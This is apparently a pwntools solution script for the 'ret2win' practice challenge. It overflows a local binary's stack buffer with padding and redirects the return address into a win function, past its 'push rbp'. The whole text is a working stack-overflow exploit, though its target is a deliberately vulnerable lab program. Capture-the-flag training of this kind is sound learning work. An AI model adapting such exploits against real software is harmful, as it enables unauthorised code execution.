from pwn import *
p = process("./ret2win")
p.sendline(b'A'*(0x20+8) + p64(0x40075+1)) # skips   push rbp
p.interactive()
